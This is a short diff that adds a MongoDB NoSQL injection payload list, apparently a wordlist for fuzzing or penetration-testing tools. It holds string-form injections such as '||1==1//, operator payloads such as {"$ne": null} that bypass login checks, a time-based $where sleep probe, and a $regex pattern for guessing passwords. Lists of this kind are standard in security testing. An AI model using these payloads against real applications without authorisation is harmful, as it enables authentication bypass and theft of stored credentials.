@@ -1,0 +1,12 @@
+# nosqli/mongo — MongoDB injection (string + JSON forms)
+'||1==1//
+'||1==1%00
+'||'a'=='a
+{"$ne": null}
+{"$gt": ""}
+{"$gt": -1}
+{"$where": "this.username == this.password"}
+{"$where": "sleep(5000) || true"}
+admin'||'1==1//
+admin'||'1==1%00
+{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
